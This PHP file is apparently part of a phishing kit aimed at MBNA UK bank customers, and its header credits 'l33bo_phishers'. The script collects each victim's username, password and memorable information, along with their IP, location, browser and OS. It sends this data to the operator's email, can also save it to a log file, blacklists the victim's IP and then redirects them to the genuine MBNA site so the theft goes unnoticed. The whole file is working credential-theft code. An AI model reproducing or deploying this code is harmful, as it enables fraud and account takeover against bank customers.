<?php
/*
Created by l33bo_phishers -- icq: 695059760 
*/
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/One_Time.php";
require "antibots.php";
require "CONTROLS.php";
if($_SERVER["HTTPS"] != "on")
{
    header("Location: https://" . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"]);
    exit();
}
error_reporting(0);
ini_set(‘display_errors’, ’0′);
$_SESSION['pwd'] = $_POST['pwd'];
$user = $_SESSION['user'];
$pwd = $_SESSION['pwd'];
$memorable = $_SESSION['memorable'] = $_POST['memorable'];
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$from = $From_Address;
$headers = "From: ANBM" . $from;
$subj = "ANBM: $ip";
$to = $Your_Email; 
$warnsubj = "Abuse";
$warn = "A user (with ip: $ip) has attempted to send you a completed form containing abusive language.This user has been redirected to the official site and blocked from accessing the page again.";
$bad_words = array('9999','sample');
$VictimInfo1 = "| IP Address :"." ".$_SERVER['REMOTE_ADDR']." (".gethostbyaddr($_SERVER['REMOTE_ADDR']).")";
$VictimInfo2 = "| Location :"." ".$systemInfo['city'].", ".$systemInfo['region'].", ".$systemInfo['country'];
$VictimInfo3 = "| UserAgent :"." ".$systemInfo['useragent'];
$VictimInfo4 = "| Browser :"." ".$systemInfo['browser'];
$VictimInfo5 = "| Platform :"." ".$systemInfo['os'];
$data = "
+ -------------  ANBM -------------+
+ Account Details
| Username : $user
| Password : $pwd
| Memorable : $memorable
+ ------------------------------------------+
+ Victim Information
$VictimInfo1
$VictimInfo2
$VictimInfo3
$VictimInfo4
$VictimInfo5
+ ------------------------------------------+
";
if($Encrypt==1) {
require "assets/includes/AES.php";
$imputText = $data;
$imputKey = $Key;
$blockSize = 256;
$aes = new AES($imputText, $imputKey, $blockSize);
$enc = $aes->encrypt();
$aes->setData($enc);
$dec=$aes->decrypt();
}
if($Abuse_Filter==1)
{
foreach($bad_words as $bad_word){
    if(stristr($_SESSION['name'], $bad_word) !== false) {
		mail($to,$warnsubj,$warn,$headers);
        exit(header("Location:  https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=2ahUKEwiAlr2br6nhAhWEzYUKHYwHDzAQFjAAegQIBhAC&url=https://www.mbna.co.uk/&usg=AOvVaw2uqgqvXv_nWDditpWcEAjB"));
    }
	if(stristr($_SESSION['mmn'], $bad_word) !== false) {
		mail($to,$warnsubj,$warn,$headers);
        exit(header("Location:  https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=2ahUKEwiAlr2br6nhAhWEzYUKHYwHDzAQFjAAegQIBhAC&url=https://www.mbna.co.uk/&usg=AOvVaw2uqgqvXv_nWDditpWcEAjB"));
    }
if(stristr($_SESSION['address'], $bad_word) !== false) {
		mail($to,$warnsubj,$warn,$headers);
        exit(header("Location:  https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=2ahUKEwiAlr2br6nhAhWEzYUKHYwHDzAQFjAAegQIBhAC&url=https://www.mbna.co.uk/&usg=AOvVaw2uqgqvXv_nWDditpWcEAjB"));
    }
}
}
if($Save_Log==1) {
	if($Encrypt==1) {
	$file=fopen("assets/logs/r35u1t.txt","a");
	fwrite($file,$enc);
	fclose($file);
	}
	else {
	$file=fopen("assets/logs/r35u1t.txt","a");
	fwrite($file,$data);
	fclose($file);
	}
}	
if($Send_Log==1) {
	if($Encrypt==1) {
	mail($to,$subj,$enc,$headers);	
	}
	else {
	mail($to,$subj,$data,$headers);	
	}
}
if($One_Time_Access==1)
{
$fp = fopen("assets/includes/blacklist.dat", "a");
fputs($fp, "\r\n$ip\r\n");
fclose($fp);
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html><head>
<title>Account Verification Completed</title>
<META content="text/html; charset=us-ascii" http-equiv=Content-Type><LINK rel="shortcut icon" type=image/x-icon href="assets/images/favicon.ico">
<meta http-equiv="refresh" content="10; url=https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=2ahUKEwiAlr2br6nhAhWEzYUKHYwHDzAQFjAAegQIBhAC&url=https://www.mbna.co.uk/&usg=AOvVaw2uqgqvXv_nWDditpWcEAjB">

</head>
<body style="background-repeat:no-repeat;" background="4.png">
	<br>
	<br>
	<br>
	<br>

</body>
</html>